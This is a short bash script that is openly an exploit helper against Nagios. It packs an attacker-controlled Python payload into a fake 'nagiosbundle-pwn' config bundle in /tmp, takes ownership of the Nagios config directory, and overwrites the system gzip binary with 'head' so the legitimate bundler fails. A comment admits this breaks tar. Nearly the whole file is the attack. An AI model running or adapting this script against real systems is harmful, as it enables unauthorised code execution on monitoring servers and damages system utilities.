#!/bin/bash

# Creates a "config bundle" with attacker-controlled payload
PAYLOAD=final_payload.py
UNBUNDLER=nagios_unbundler.py
BUNDLE=nagiosbundle-pwn.tar.gz
EXPECTED_LOCATION=/tmp
CONFIG_DIR=/usr/local/nagios/etc/

set -e

#echo "[ ] Creating configuration directory ($CONFIG_DIR)..."
mkdir -p $CONFIG_DIR
chown `whoami` $CONFIG_DIR
touch $CONFIG_DIR/nagios.cfg
touch $CONFIG_DIR/resource.cfg

#echo "[ ] Creating bundle ($EXPECTED_LOCATION/$BUNDLE)..."
cp $PAYLOAD $UNBUNDLER
tar czf $BUNDLE $UNBUNDLER
mv $BUNDLE $EXPECTED_LOCATION
rm $UNBUNDLER

#echo "[ ] Replacing gzip so their bundler script won't work..."
GZIP_BIN=`which gzip`
cp -n $GZIP_BIN $GZIP_BIN.bak
cp `which head` $GZIP_BIN
#echo "[ ] Gzip bin saved to $GZIP_BIN.bak (NOTE: this just broke tar on this system until restored!)"
